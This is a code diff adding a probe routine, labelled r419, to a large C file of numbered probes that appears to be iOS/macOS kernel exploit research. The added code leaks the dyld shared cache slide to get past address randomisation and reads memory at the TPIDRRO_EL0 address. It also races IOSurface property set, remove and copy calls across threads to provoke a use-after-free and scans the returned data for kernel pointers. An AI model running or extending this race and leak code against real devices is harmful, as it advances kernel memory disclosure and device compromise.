@@ -16479,6 +16479,260 @@ static void r410_probe(void) {
 }
 
 /*
+ * r419: ARM64 system registers + property data race + shared cache.
+ *
+ * 1. Read EL0-accessible ARM64 system registers (TPIDRRO_EL0, etc.)
+ * 2. Property data race: concurrent SetValue/CopyValue/RemoveValue
+ *    to trigger a TOCTOU where CopyValue reads freed/stale memory
+ * 3. Shared cache slide analysis and correlation
+ */
+#include <dlfcn.h>
+
+static volatile int g_r419_race_done = 0;
+static volatile int g_r419_kern_found = 0;
+
+static void *r419_race_writer(void *arg) {
+    IOSurfaceRef surf = (IOSurfaceRef)arg;
+    CFStringRef key = CFStringCreateWithCString(NULL, "racekey",
+        kCFStringEncodingASCII);
+
+    uint8_t data[128];
+    memset(data, 0x41, sizeof(data));
+
+    for (int i = 0; i < 50000 && !g_r419_kern_found; i++) {
+        CFDataRef dref = CFDataCreate(NULL, data, sizeof(data));
+        IOSurfaceSetValue(surf, key, dref);
+        CFRelease(dref);
+        IOSurfaceRemoveValue(surf, key);
+    }
+    g_r419_race_done = 1;
+    CFRelease(key);
+    return NULL;
+}
+
+static void *r419_race_reader(void *arg) {
+    IOSurfaceRef surf = (IOSurfaceRef)arg;
+    CFStringRef key = CFStringCreateWithCString(NULL, "racekey",
+        kCFStringEncodingASCII);
+    int checked = 0;
+
+    while (!g_r419_race_done && !g_r419_kern_found) {
+        CFTypeRef val = IOSurfaceCopyValue(surf, key);
+        if (val) {
+            if (CFGetTypeID(val) == CFDataGetTypeID()) {
+                CFIndex len = CFDataGetLength(val);
+                const uint8_t *bytes = CFDataGetBytePtr(val);
+                /* Scan for kernel-range values in returned data */
+                for (CFIndex b = 0; b + 7 < len; b += 8) {
+                    uint64_t v;
+                    memcpy(&v, bytes + b, 8);
+                    if ((v >> 32) >= 0xFFFFFFF0ULL && v != 0x4141414141414141ULL) {
+                        rlog("    *** KERNEL DATA IN PROPERTY: off=%ld val=0x%016llx ***\n",
+                            (long)b, (unsigned long long)v);
+                        g_r419_kern_found = 1;
+                    }
+                    /* Also check for pointers that differ from our 0x41 pattern */
+                    if (v != 0x4141414141414141ULL &&
+                        v != 0 && (v >> 40) != 0) {
+                        if (checked < 5) {
+                            rlog("    Race anomaly: off=%ld val=0x%016llx\n",
+                                (long)b, (unsigned long long)v);
+                            checked++;
+                        }
+                    }
+                }
+            }
+            CFRelease(val);
+        }
+    }
+    CFRelease(key);
+    return NULL;
+}
+
+static void r419_probe(void) {
+    rlog("\n=== r419: System Registers + Data Race + Shared Cache ===\n\n");
+    fflush(stdout);
+
+    /* ---- Vector 1: ARM64 EL0-readable system registers ---- */
+    rlog("  Vector 1: ARM64 system registers\n");
+    {
+#ifdef __arm64__
+        uint64_t tpidr_el0, tpidrro_el0;
+        uint64_t cntpct, cntvct;
+        uint64_t ctr_el0, dczid_el0;
+
+        __asm__ volatile("mrs %0, TPIDR_EL0" : "=r"(tpidr_el0));
+        __asm__ volatile("mrs %0, TPIDRRO_EL0" : "=r"(tpidrro_el0));
+        __asm__ volatile("mrs %0, CNTPCT_EL0" : "=r"(cntpct));
+        __asm__ volatile("mrs %0, CNTVCT_EL0" : "=r"(cntvct));
+        __asm__ volatile("mrs %0, CTR_EL0" : "=r"(ctr_el0));
+        __asm__ volatile("mrs %0, DCZID_EL0" : "=r"(dczid_el0));
+
+        rlog("    TPIDR_EL0    = 0x%016llx\n", (unsigned long long)tpidr_el0);
+        rlog("    TPIDRRO_EL0  = 0x%016llx\n", (unsigned long long)tpidrro_el0);
+        rlog("    CNTPCT_EL0   = 0x%016llx\n", (unsigned long long)cntpct);
+        rlog("    CNTVCT_EL0   = 0x%016llx\n", (unsigned long long)cntvct);
+        rlog("    CTR_EL0      = 0x%016llx\n", (unsigned long long)ctr_el0);
+        rlog("    DCZID_EL0    = 0x%016llx\n", (unsigned long long)dczid_el0);
+
+        if ((tpidr_el0 >> 32) >= 0xFFFFFFF0ULL)
+            rlog("    *** TPIDR_EL0 IN KERNEL RANGE ***\n");
+        if ((tpidrro_el0 >> 32) >= 0xFFFFFFF0ULL)
+            rlog("    *** TPIDRRO_EL0 IN KERNEL RANGE ***\n");
+
+        /* Read TPIDRRO for multiple threads to see pattern */
+        rlog("    TPIDRRO across threads:\n");
+        for (int t = 0; t < 3; t++) {
+            __block uint64_t thrTpidrro = 0;
+            dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+            dispatch_async(dispatch_get_global_queue(QOS_CLASS_DEFAULT, 0), ^{
+                __asm__ volatile("mrs %0, TPIDRRO_EL0" : "=r"(thrTpidrro));
+                dispatch_semaphore_signal(sem);
+            });
+            dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
+            rlog("      thread[%d]: TPIDRRO=0x%016llx\n",
+                t, (unsigned long long)thrTpidrro);
+        }
+
+        /* Probe data at TPIDRRO address */
+        if (tpidrro_el0 != 0) {
+            rlog("    Data at TPIDRRO_EL0 (0x%llx):\n",
+                (unsigned long long)tpidrro_el0);
+            mach_vm_size_t outSz = 0;
+            uint64_t tdata[16];
+            kern_return_t kr = mach_vm_read_overwrite(mach_task_self(),
+                tpidrro_el0, 128, (mach_vm_address_t)tdata, &outSz);
+            if (kr == KERN_SUCCESS) {
+                for (int i = 0; i < 16; i++) {
+                    rlog("      +%d: 0x%016llx", i * 8,
+                        (unsigned long long)tdata[i]);
+                    if ((tdata[i] >> 32) >= 0xFFFFFFF0ULL)
+                        rlog(" *** KERNEL ***");
+                    rlog("\n");
+                }
+            } else {
+                rlog("      read failed: kr=%d (0x%x)\n", kr, kr);
+            }
+        }
+#endif
+    }
+    fflush(stdout);
+
+    /* ---- Vector 2: Shared cache info ---- */
+    rlog("\n  Vector 2: Shared cache analysis\n");
+    {
+        /* _dyld_get_shared_cache_range */
+        typedef int (*dyld_shared_cache_range_fn)(size_t *length);
+        void *cache_base = NULL;
+        size_t cache_len = 0;
+
+        /* Use _dyld_get_shared_cache_range if available */
+        typedef const void* (*get_range_fn)(size_t*);
+        get_range_fn getRangeFn = (get_range_fn)dlsym(RTLD_DEFAULT,
+            "_dyld_get_shared_cache_range");
+        if (getRangeFn) {
+            cache_base = (void*)getRangeFn(&cache_len);
+            rlog("    Shared cache: base=%p size=0x%lx (%.1fMB)\n",
+                cache_base, (unsigned long)cache_len,
+                (double)cache_len / (1024*1024));
+        }
+
+        /* _dyld_get_shared_cache_uuid */
+        typedef int (*get_uuid_fn)(uuid_t);
+        get_uuid_fn getUuidFn = (get_uuid_fn)dlsym(RTLD_DEFAULT,
+            "_dyld_get_shared_cache_uuid");
+        if (getUuidFn) {
+            uuid_t uuid;
+            if (getUuidFn(uuid)) {
+                char ustr[64];
+                uuid_unparse(uuid, ustr);
+                rlog("    Shared cache UUID: %s\n", ustr);
+            }
+        }
+
+        /* Shared cache slide — from dyld_all_image_infos.sharedCacheSlide */
+        struct task_dyld_info dyld_info;
+        mach_msg_type_number_t cnt = TASK_DYLD_INFO_COUNT;
+        kern_return_t kr = task_info(mach_task_self(), TASK_DYLD_INFO,
+            (task_info_t)&dyld_info, &cnt);
+        if (kr == KERN_SUCCESS) {
+            /* Read sharedCacheSlide from dyld_all_image_infos */
+            uint8_t infoBlob[384];
+            mach_vm_size_t outSz = 0;
+            kr = mach_vm_read_overwrite(mach_task_self(),
+                dyld_info.all_image_info_addr, 384,
+                (mach_vm_address_t)infoBlob, &outSz);
+            if (kr == KERN_SUCCESS && outSz >= 384) {
+                /* sharedCacheSlide is typically at offset 0x108 or 0x110 */
+                uint64_t slide108, slide110, slide118;
+                memcpy(&slide108, infoBlob + 0x108, 8);
+                memcpy(&slide110, infoBlob + 0x110, 8);
+                memcpy(&slide118, infoBlob + 0x118, 8);
+                rlog("    dyld_all_image_infos sharedCacheSlide candidates:\n");
+                rlog("      +0x108: 0x%016llx\n", (unsigned long long)slide108);
+                rlog("      +0x110: 0x%016llx\n", (unsigned long long)slide110);
+                rlog("      +0x118: 0x%016llx\n", (unsigned long long)slide118);
+
+                /* Dump offsets 0xF0-0x180 for full context */
+                rlog("    Raw bytes 0xF0-0x17F:\n");
+                for (int off = 0xF0; off < 0x180; off += 8) {
+                    uint64_t v;
+                    memcpy(&v, infoBlob + off, 8);
+                    if (v != 0)
+                        rlog("      +0x%x: 0x%016llx\n", off, (unsigned long long)v);
+                }
+            }
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Vector 3: Property data race ---- */
+    rlog("\n  Vector 3: Property data race (50K iterations)\n");
+    {
+        unsigned pixFmt = 'BGRA';
+        const void *kk[] = {
+            kIOSurfaceWidth, kIOSurfaceHeight,
+            kIOSurfaceBytesPerRow, kIOSurfacePixelFormat,
+            kIOSurfaceAllocSize
+        };
+        int w = 64, h = 64, bpr = 256, as = 16384;
+        CFNumberRef vv[] = {
+            CFNumberCreate(NULL, kCFNumberIntType, &w),
+            CFNumberCreate(NULL, kCFNumberIntType, &h),
+            CFNumberCreate(NULL, kCFNumberIntType, &bpr),
+            CFNumberCreate(NULL, kCFNumberIntType, &pixFmt),
+            CFNumberCreate(NULL, kCFNumberIntType, &as)
+        };
+        CFDictionaryRef rprops = CFDictionaryCreate(NULL, kk,
+            (const void**)vv, 5,
+            &kCFTypeDictionaryKeyCallBacks,
+            &kCFTypeDictionaryValueCallBacks);
+
+        IOSurfaceRef surf = IOSurfaceCreate(rprops);
+        g_r419_race_done = 0;
+        g_r419_kern_found = 0;
+
+        pthread_t writer, reader;
+        pthread_create(&writer, NULL, r419_race_writer, surf);
+        pthread_create(&reader, NULL, r419_race_reader, surf);
+
+        pthread_join(writer, NULL);
+        pthread_join(reader, NULL);
+
+        rlog("    Race complete. Kernel data found: %s\n",
+            g_r419_kern_found ? "YES" : "NO");
+
+        CFRelease(surf);
+        CFRelease(rprops);
+        for (int i = 0; i < 5; i++) CFRelease(vv[i]);
+    }
+    fflush(stdout);
+
+    rlog("\n=== r419 complete ===\n");
+    fflush(stdout);
+}
+
+/*
  * r418: Thread state kernel trap + commpage + task_info.
  *
  * Key vectors:
@@ -70542,6 +70796,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 422) {
+            rlog("*** rounds=422: System Registers + Data Race + Shared Cache ***\n");
+            rlog("  TPIDRRO_EL0, shared cache slide, property race.\n\n");
+            fflush(stdout);
+            r419_probe();
+            goto done;
+        }
         if (rounds == 421) {
             rlog("*** rounds=421: Thread State + Commpage + task_info ***\n");
             rlog("  Register state during syscall, commpage, dyld info, sysctl.\n\n");
@@ -73081,7 +73342,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
